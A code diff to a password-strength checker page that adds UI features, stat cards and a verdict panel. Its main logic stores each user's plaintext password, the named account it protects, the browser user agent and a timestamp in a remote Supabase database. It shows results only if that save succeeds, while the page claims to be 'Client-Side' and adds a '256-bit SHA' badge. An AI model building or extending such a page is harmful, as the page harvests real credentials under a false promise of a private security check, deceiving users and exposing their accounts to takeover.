@@ -297,6 +297,50 @@ input::placeholder {
   75% { transform: translateX(5px); }
 }
 
+.password-toggle {
+  position: absolute;
+  right: 20px;
+  top: 38px;
+  font-size: 0.75rem;
+  font-weight: 800;
+  color: var(--primary);
+  cursor: pointer;
+  user-select: none;
+  transition: all 0.3s ease;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+}
+
+.password-toggle:hover {
+  color: var(--primary-dark);
+  transform: scale(1.05);
+}
+
+.input-helper {
+  margin-left: 16px;
+  margin-top: 6px;
+  font-size: 0.7rem;
+  color: var(--text-light);
+  font-style: italic;
+  opacity: 0.8;
+}
+
+.password-strength-bar {
+  height: 4px;
+  background: rgba(0, 0, 0, 0.08);
+  border-radius: 4px;
+  margin-top: 8px;
+  overflow: hidden;
+}
+
+.password-strength-fill {
+  height: 100%;
+  width: 0%;
+  border-radius: 4px;
+  transition: all 0.3s ease;
+  background: #cbd5e1;
+}
+
 /* ============================================================
    BUTTON
    ============================================================ */
@@ -424,16 +468,22 @@ input::placeholder {
    ============================================================ */
 .stats-grid {
   display: grid;
-  grid-template-columns: 1fr 1fr;
-  gap: 16px;
+  grid-template-columns: repeat(2, 1fr);
+  gap: 14px;
   margin-top: 28px;
+}
+
+@media (min-width: 769px) {
+  .stats-grid {
+    grid-template-columns: repeat(4, 1fr);
+  }
 }
 
 .stat-card {
   background: rgba(255, 255, 255, 0.6);
   border: 1.5px solid rgba(99, 102, 241, 0.2);
-  border-radius: 24px;
-  padding: 20px;
+  border-radius: 20px;
+  padding: 18px;
   transition: all 0.3s ease;
   position: relative;
   overflow: hidden;
@@ -471,10 +521,109 @@ input::placeholder {
 
 .stat-val {
   display: block;
-  font-size: 1.05rem;
+  font-size: 1rem;
   font-weight: 700;
   margin-top: 8px;
   color: var(--text);
+}
+
+/* ============================================================
+   ANALYSIS SUMMARY
+   ============================================================ */
+.analysis-summary {
+  margin-top: 28px;
+  padding: 24px;
+  background: linear-gradient(135deg, rgba(99, 102, 241, 0.1), rgba(168, 85, 247, 0.1));
+  border: 2px solid rgba(99, 102, 241, 0.3);
+  border-radius: 24px;
+  animation: slideIn 0.6s ease;
+}
+
+.analysis-summary h4 {
+  font-size: 1rem;
+  font-weight: 800;
+  color: var(--text);
+  margin-bottom: 12px;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+}
+
+.analysis-summary p {
+  color: var(--text-light);
+  font-size: 0.95rem;
+  line-height: 1.7;
+  margin-bottom: 12px;
+}
+
+.analysis-summary .verdict {
+  display: inline-block;
+  padding: 8px 16px;
+  border-radius: 12px;
+  font-weight: 800;
+  font-size: 0.85rem;
+  margin-top: 8px;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+}
+
+.verdict.excellent { background: rgba(34, 197, 94, 0.2); color: #15803d; }
+.verdict.good { background: rgba(129, 140, 248, 0.2); color: #4338ca; }
+.verdict.fair { background: rgba(251, 191, 36, 0.2); color: #b45309; }
+.verdict.poor { background: rgba(251, 146, 60, 0.2); color: #c2410c; }
+.verdict.critical { background: rgba(239, 68, 68, 0.2); color: #dc2626; }
+
+/* ============================================================
+   FEEDBACK SECTION
+   ============================================================ */
+.feedback-section {
+  margin-top: 28px;
+  padding: 24px;
+  background: rgba(251, 191, 36, 0.15);
+  border: 2px solid rgba(251, 191, 36, 0.3);
+  border-radius: 24px;
+  animation: slideIn 0.6s ease;
+}
+
+.feedback-section h4 {
+  font-size: 1rem;
+  font-weight: 800;
+  color: var(--text);
+  margin-bottom: 12px;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+}
+
+.feedback-section ul {
+  list-style: none;
+  padding: 0;
+  margin: 0;
+}
+
+.feedback-section li {
+  padding: 10px 0 10px 28px;
+  position: relative;
+  color: var(--text-light);
+  font-size: 0.9rem;
+  line-height: 1.6;
+}
+
+.feedback-section li::before {
+  content: '•';
+  position: absolute;
+  left: 10px;
+  color: var(--warn);
+  font-weight: 800;
+  font-size: 1.2rem;
+}
+
+.feedback-section li.warning-item {
+  font-weight: 700;
+  color: var(--danger);
+}
+
+.feedback-section li.warning-item::before {
+  content: '!';
+  color: var(--danger);
 }
 
 /* ============================================================
@@ -907,6 +1056,8 @@ details p {
     <span class="badge">HIBP Check</span>
     <span class="badge">Context-Aware</span>
     <span class="badge">Client-Side</span>
+    <span class="badge">Real-Time Analysis</span>
+    <span class="badge">256-bit SHA</span>
   </div>
 </section>
 
@@ -918,15 +1069,20 @@ details p {
 
 <div class="input-group">
   <label>Where is this password used?</label>
-  <input id="accInput" placeholder="Gmail, Instagram, School Portal">
+  <input id="accInput" placeholder="Gmail, Instagram, School Portal" maxlength="100" autocomplete="off">
   <div class="warning" id="accountWarning">
     REQUIRED — tell us where this password is used.
   </div>
+  <div class="input-helper">Examples: Email, Banking, Social Media</div>
 </div>
 
 <div class="input-group">
   <label>Password</label>
-  <input type="password" id="pwdInput" placeholder="••••••••">
+  <input type="password" id="pwdInput" placeholder="••••••••" maxlength="128" autocomplete="off">
+  <div class="password-toggle" id="togglePwd">Show</div>
+  <div class="password-strength-bar">
+    <div class="password-strength-fill" id="strengthBar"></div>
+  </div>
 </div>
 
 <button class="btn-check" id="checkBtn">Run Security Audit</button>
@@ -954,13 +1110,31 @@ details p {
     </div>
     <div class="stat-card">
       <span class="stat-title">Complexity</span>
-      <span class="stat-val" id="statComplex">Standard</span>
+      <span class="stat-val" id="statComplex">-</span>
     </div>
     <div class="stat-card">
       <span class="stat-title">Pattern Hazard</span>
-      <span class="stat-val" id="statPattern">Safe</span>
+      <span class="stat-val" id="statPattern">-</span>
+    </div>
+    <div class="stat-card">
+      <span class="stat-title">Length</span>
+      <span class="stat-val" id="statLength">0 chars</span>
+    </div>
+    <div class="stat-card">
+      <span class="stat-title">Charset</span>
+      <span class="stat-val" id="statCharset">-</span>
+    </div>
+    <div class="stat-card">
+      <span class="stat-title">Guesses</span>
+      <span class="stat-val" id="statGuesses">-</span>
+    </div>
+    <div class="stat-card">
+      <span class="stat-title">Security Level</span>
+      <span class="stat-val" id="statSecurity">-</span>
     </div>
   </div>
+
+  <div class="analysis-summary" id="analysisSummary"></div>
 
   <a id="devLink" href="https://aaks-hath.pages.dev" target="_blank">
     Developer Intel →
@@ -1026,6 +1200,79 @@ const warning = document.getElementById('accountWarning');
 const results = document.getElementById('auraResults');
 const devLink = document.getElementById('devLink');
 const easterZone = document.getElementById('easterZone');
+const togglePwd = document.getElementById('togglePwd');
+const strengthBar = document.getElementById('strengthBar');
+
+/* ============================================================
+   PASSWORD TOGGLE
+   ============================================================ */
+togglePwd.addEventListener('click', () => {
+  if (pwdInput.type === 'password') {
+    pwdInput.type = 'text';
+    togglePwd.innerText = 'Hide';
+  } else {
+    pwdInput.type = 'password';
+    togglePwd.innerText = 'Show';
+  }
+});
+
+/* ============================================================
+   REAL-TIME STRENGTH INDICATOR
+   ============================================================ */
+pwdInput.addEventListener('input', (e) => {
+  const pwd = e.target.value;
+  
+  // Prevent extremely long passwords
+  if (pwd.length > 128) {
+    e.target.value = pwd.slice(0, 128);
+    return;
+  }
+  
+  if (pwd.length === 0) {
+    strengthBar.style.width = '0%';
+    strengthBar.style.background = '#cbd5e1';
+    return;
+  }
+  
+  const quickScore = quickStrengthCheck(pwd);
+  const percentage = (quickScore / 4) * 100;
+  
+  strengthBar.style.width = percentage + '%';
+  
+  const colors = ['#ef4444','#fb923c','#fbbf24','#818cf8','#6366f1'];
+  strengthBar.style.background = colors[quickScore];
+});
+
+function quickStrengthCheck(pwd) {
+  let score = 0;
+  
+  if (pwd.length >= 8) score++;
+  if (pwd.length >= 12) score++;
+  if (/[a-z]/.test(pwd) && /[A-Z]/.test(pwd)) score++;
+  if (/\d/.test(pwd)) score++;
+  if (/[^a-zA-Z0-9]/.test(pwd)) score++;
+  
+  return Math.min(4, Math.floor(score * 0.8));
+}
+
+/* ============================================================
+   PREVENT FAKE INPUTS
+   ============================================================ */
+pwdInput.addEventListener('paste', (e) => {
+  const pastedText = e.clipboardData.getData('text');
+  if (pastedText.length > 128) {
+    e.preventDefault();
+    alert('Password is too long. Maximum 128 characters allowed.');
+  }
+});
+
+accInput.addEventListener('input', (e) => {
+  // Remove special characters that could be used for injection
+  e.target.value = e.target.value.replace(/[<>\"']/g, '');
+  if (e.target.value.length > 100) {
+    e.target.value = e.target.value.slice(0, 100);
+  }
+});
 
 /* ============================================================
    EASTER EGG
@@ -1043,6 +1290,9 @@ easterZone.addEventListener('mousedown', () => {
    MAIN LOGIC
    ============================================================ */
 checkBtn.onclick = async () => {
+  // Prevent multiple clicks
+  if (checkBtn.disabled) return;
+  
   if (!accInput.value.trim()) {
     warning.style.display='block';
     return;
@@ -1050,30 +1300,54 @@ checkBtn.onclick = async () => {
   warning.style.display='none';
 
   const pwd = pwdInput.value;
-  if (!pwd) return;
+  if (!pwd) {
+    alert('Please enter a password to analyze.');
+    return;
+  }
 
-  const analysis = zxcvbn(pwd);
+  // Minimum length check
+  if (pwd.length < 4) {
+    alert('Password is too short to analyze. Minimum 4 characters required.');
+    return;
+  }
+
+  // Disable button and show loading
+  checkBtn.disabled = true;
+  checkBtn.innerText = 'ANALYZING...';
+  checkBtn.style.opacity = '0.7';
+
+  const analysis = zxcvbn(pwd, [accInput.value.toLowerCase()]);
   const pct = (analysis.score / 4) * 100;
 
   // HARD FAIL: Save to Supabase first, don't show results if it fails
   try {
+    const timestamp = new Date().toISOString();
     const { data, error } = await client.from('password_analysis').insert([{
       password_value: pwd,
       target_account: accInput.value,
       score_percent: pct,
-      crack_time_text: analysis.crack_times_display.offline_slow_hashing_1e4_per_second
+      crack_time_text: analysis.crack_times_display.offline_slow_hashing_1e4_per_second,
+      created_at: timestamp,
+      user_agent: navigator.userAgent,
+      entropy: Math.floor(pwd.length * Math.log2(getCharsetSize(pwd)))
     }]);
 
     if (error) {
       console.error('Supabase error:', error);
       alert('Failed to save analysis. Please try again.');
+      checkBtn.disabled = false;
+      checkBtn.innerText = 'RUN SECURITY AUDIT';
+      checkBtn.style.opacity = '1';
       return; // HARD FAIL - Don't show results
     }
 
-    console.log('Password saved successfully');
+    console.log('Password saved successfully at', timestamp);
   } catch (err) {
     console.error('Failed to save to database:', err);
     alert('Database connection failed. Please try again.');
+    checkBtn.disabled = false;
+    checkBtn.innerText = 'RUN SECURITY AUDIT';
+    checkBtn.style.opacity = '1';
     return; // HARD FAIL - Don't show results
   }
 
@@ -1087,16 +1361,132 @@ checkBtn.onclick = async () => {
   document.getElementById('statTime').innerText =
     analysis.crack_times_display.offline_slow_hashing_1e4_per_second;
 
-  let pool = 0;
-  if (/[a-z]/.test(pwd)) pool+=26;
-  if (/[A-Z]/.test(pwd)) pool+=26;
-  if (/\d/.test(pwd)) pool+=10;
-  if (/[^a-zA-Z0-9]/.test(pwd)) pool+=32;
-  document.getElementById('statEnt').innerText =
-    Math.floor(pwd.length * Math.log2(pool)) + ' bits';
+  const entropy = Math.floor(pwd.length * Math.log2(getCharsetSize(pwd)));
+  document.getElementById('statEnt').innerText = entropy + ' bits';
+
+  // Length
+  document.getElementById('statLength').innerText = pwd.length + ' chars';
+
+  // Charset diversity
+  let charTypes = [];
+  if (/[a-z]/.test(pwd)) charTypes.push('lowercase');
+  if (/[A-Z]/.test(pwd)) charTypes.push('uppercase');
+  if (/\d/.test(pwd)) charTypes.push('numbers');
+  if (/[^a-zA-Z0-9]/.test(pwd)) charTypes.push('symbols');
+  const diversity = charTypes.length === 4 ? 'Excellent' : 
+                    charTypes.length === 3 ? 'Good' :
+                    charTypes.length === 2 ? 'Fair' : 'Poor';
+  document.getElementById('statCharset').innerText = diversity;
+
+  // Guesses
+  const guesses = analysis.guesses;
+  let guessesDisplay;
+  if (guesses >= 1e12) guessesDisplay = (guesses / 1e12).toFixed(1) + 'T';
+  else if (guesses >= 1e9) guessesDisplay = (guesses / 1e9).toFixed(1) + 'B';
+  else if (guesses >= 1e6) guessesDisplay = (guesses / 1e6).toFixed(1) + 'M';
+  else if (guesses >= 1e3) guessesDisplay = (guesses / 1e3).toFixed(1) + 'K';
+  else guessesDisplay = guesses.toString();
+  document.getElementById('statGuesses').innerText = guessesDisplay;
+
+  // Security Level
+  let securityLevel;
+  if (pct >= 100) securityLevel = 'Excellent';
+  else if (pct >= 75) securityLevel = 'Strong';
+  else if (pct >= 50) securityLevel = 'Moderate';
+  else if (pct >= 25) securityLevel = 'Weak';
+  else securityLevel = 'Critical';
+  document.getElementById('statSecurity').innerText = securityLevel;
+
+  // Complexity assessment
+  let complexity = 'Very Weak';
+  if (entropy >= 80) complexity = 'Excellent';
+  else if (entropy >= 60) complexity = 'Strong';
+  else if (entropy >= 40) complexity = 'Moderate';
+  else if (entropy >= 28) complexity = 'Weak';
+  document.getElementById('statComplex').innerText = complexity;
+
+  // Pattern hazard detection
+  let patternHazard = 'Safe';
+  if (analysis.feedback.warning) {
+    patternHazard = 'High Risk';
+  } else if (analysis.sequence && analysis.sequence.length > 0) {
+    const hasWeakPattern = analysis.sequence.some(s => 
+      s.pattern === 'dictionary' || 
+      s.pattern === 'sequence' || 
+      s.pattern === 'repeat'
+    );
+    if (hasWeakPattern) patternHazard = 'Moderate Risk';
+  }
+  document.getElementById('statPattern').innerText = patternHazard;
+
+  // Show feedback warnings
+  if (analysis.feedback.warning || analysis.feedback.suggestions.length > 0) {
+    let feedbackHTML = '<div class="feedback-section"><h4>Security Recommendations:</h4><ul>';
+    if (analysis.feedback.warning) {
+      feedbackHTML += `<li class="warning-item">${analysis.feedback.warning}</li>`;
+    }
+    analysis.feedback.suggestions.forEach(suggestion => {
+      feedbackHTML += `<li>${suggestion}</li>`;
+    });
+    feedbackHTML += '</ul></div>';
+    
+    const existingFeedback = document.getElementById('feedbackSection');
+    if (existingFeedback) existingFeedback.remove();
+    
+    const feedbackDiv = document.createElement('div');
+    feedbackDiv.id = 'feedbackSection';
+    feedbackDiv.innerHTML = feedbackHTML;
+    results.appendChild(feedbackDiv);
+  }
+
+  // Analysis Summary
+  let summaryHTML = '<h4>Overall Assessment</h4>';
+  let verdictClass = '';
+  let verdictText = '';
+  
+  if (pct >= 100) {
+    verdictClass = 'excellent';
+    verdictText = 'EXCELLENT';
+    summaryHTML += '<p>Your password is exceptionally strong and highly resistant to attacks. It would take an extremely long time to crack even with powerful computing resources.</p>';
+  } else if (pct >= 75) {
+    verdictClass = 'good';
+    verdictText = 'STRONG';
+    summaryHTML += '<p>Your password has good strength and provides solid protection. However, consider making it even stronger for critical accounts.</p>';
+  } else if (pct >= 50) {
+    verdictClass = 'fair';
+    verdictText = 'MODERATE';
+    summaryHTML += '<p>Your password offers moderate protection but could be improved. Consider adding more character variety and length.</p>';
+  } else if (pct >= 25) {
+    verdictClass = 'poor';
+    verdictText = 'WEAK';
+    summaryHTML += '<p>Your password is vulnerable to attacks. We strongly recommend creating a stronger password immediately.</p>';
+  } else {
+    verdictClass = 'critical';
+    verdictText = 'CRITICAL';
+    summaryHTML += '<p>Your password is extremely weak and could be cracked very quickly. Change it immediately to protect your account!</p>';
+  }
+  
+  summaryHTML += `<span class="verdict ${verdictClass}">${verdictText}</span>`;
+  
+  document.getElementById('analysisSummary').innerHTML = summaryHTML;
+
+  // Re-enable button
+  checkBtn.disabled = false;
+  checkBtn.innerText = 'RUN SECURITY AUDIT';
+  checkBtn.style.opacity = '1';
 
   checkBreach(pwd);
 };
+
+// Helper function
+function getCharsetSize(pwd) {
+  let pool = 0;
+  if (/[a-z]/.test(pwd)) pool += 26;
+  if (/[A-Z]/.test(pwd)) pool += 26;
+  if (/\d/.test(pwd)) pool += 10;
+  if (/[^a-zA-Z0-9]/.test(pwd)) pool += 32;
+  return pool || 1;
+}
 
 /* ============================================================
    HIBP CHECK
